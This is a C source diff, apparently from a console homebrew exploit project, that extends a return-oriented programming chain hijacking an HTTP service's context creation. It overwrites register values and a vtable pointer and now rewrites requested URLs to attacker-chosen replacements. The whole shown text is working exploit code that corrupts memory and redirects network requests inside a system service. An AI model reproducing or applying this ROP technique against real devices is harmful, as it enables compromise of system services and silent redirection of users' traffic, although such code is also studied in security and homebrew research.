@@ -564,6 +564,8 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 Result setuphaxx_httpheap_sharedmem()
 {
 	u32 pos, i;
+	u32 tmp_pos;
+	u32 tmpval;
 
 	u32 *ropchain = (u32*)ropvmem_sharedmem;
 	u32 ropvaddr = ropvmem_base;
@@ -685,30 +687,57 @@ Result setuphaxx_httpheap_sharedmem()
 	ropgen_movr1r0(&ropchain, &ropvaddr);
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);//r0 = cmdbuf[4], URL ptr.
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x18, 1);//Write the URL ptr to ropheap+0x18.
-	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below memcpy with the above URL ptr.
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncpy with the above URL ptr.
 
 	ropgen_strncpy(&ropchain, &ropvaddr, ropheap+0x100, 0, 0xff);//strncpy(ropheap+0x100, createcontext_inputurl, 0xff);
 
 	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropheap+0x1c, 1);//*((u32*)(ropheap+0x1c)) = 0;
+	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropheap+0x20, 1);//*((u32*)(ropheap+0x20)) = 0;
 
 	for(pos=0; pos<targeturl_list_entcount; pos++)
 	{
+		tmpval = 0;
+		if(targeturl_list[pos].new_url[0])tmpval+= 0x30;
+
 		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x1c, 1);
 		ropgen_popr1(&ropchain, &ropvaddr, 0);
-		ropgen_checkcond(&ropchain, &ropvaddr, 0, ropvaddr + 0x40 + 0x74 + 0x8 + 0x40 + 0x30, 0);//if(<vtableptr value was set in a previous loop iteration>)<pivot to the end of this iteration block>
+		ropgen_checkcond(&ropchain, &ropvaddr, 0, ropvaddr + 0x40 + 0x74 + 0x8 + 0x40 + 0x30 + tmpval, 0);//if(<vtableptr value was set in a previous loop iteration>)<pivot to the end of this iteration block>
+
+		tmp_pos = targeturl_list_vaddr + pos*sizeof(targeturlctx);
 
 		memset(params, 0, sizeof(params));
 		params[0] = ropheap+0x100;
-		params[1] = targeturl_list_vaddr + pos*sizeof(targeturlctx) + offsetof(targeturlctx, url);
+		params[1] = tmp_pos + offsetof(targeturlctx, url);
 		params[2] = strnlen(targeturl_list[pos].url, 0xff);
 
-		ropgen_callfunc(&ropchain, &ropvaddr, ROP_strncmp, params);//if(strncmp(createcontext_inputurl, targeturl_list[pos].url, 0xff)==0)*((u32*)(ropheap+0x1c)) = targeturl_list[pos].vtableptr;
+		ropgen_callfunc(&ropchain, &ropvaddr, ROP_strncmp, params);
+		/*
+		if(strncmp(createcontext_inputurl, targeturl_list[pos].url, 0xff)==0)
+		{
+			*((u32*)(ropheap+0x1c)) = targeturl_list[pos].vtableptr;
+			*((u32*)(ropheap+0x20)) = targeturl_list[pos].new_url;//Not generated when new_url is empty.
+		}
+		*/
 
 		ropgen_popr1(&ropchain, &ropvaddr, 0);
-		ropgen_checkcond(&ropchain, &ropvaddr, 0, ropvaddr + 0x40 + 0x30, 0);
+		ropgen_checkcond(&ropchain, &ropvaddr, 0, ropvaddr + 0x40 + 0x30 + tmpval, 0);
 
 		ropgen_writeu32(&ropchain, &ropvaddr, targeturl_list[pos].vtableptr, ropheap+0x1c, 1);
+		if(tmpval)ropgen_writeu32(&ropchain, &ropvaddr, tmp_pos + offsetof(targeturlctx, new_url), ropheap+0x20, 1);
 	}
+
+	//if(<new_url ptr initialized above is actually set>)<execute the following strncpy ROP>
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x20, 1);
+	ropgen_popr1(&ropchain, &ropvaddr, 0);
+	ropgen_checkcond(&ropchain, &ropvaddr, ropvaddr + 0x48 + 0x20*4 + 0x74, 0, 1);
+
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x18, 1);//r0 = URL bufptr originally from the cmdbuf.
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20*3 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below strncpy with the above URL ptr.
+
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x20, 1);
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncpy with the above new_url ptr.
+
+	ropgen_strncpy(&ropchain, &ropvaddr, 0, 0, 0xff);//strncpy(createcontext_inputurl, targeturl_list[targetindex].new_url, 0xff);
 
 	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x0, ropvaddr + 0x20 + 0x40 + 0x4, 0x3);//Overwrite the r4 value which gets popped below, with the saved cmdbuf ptr from above.
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//Restore r0 to the _this value copied above.
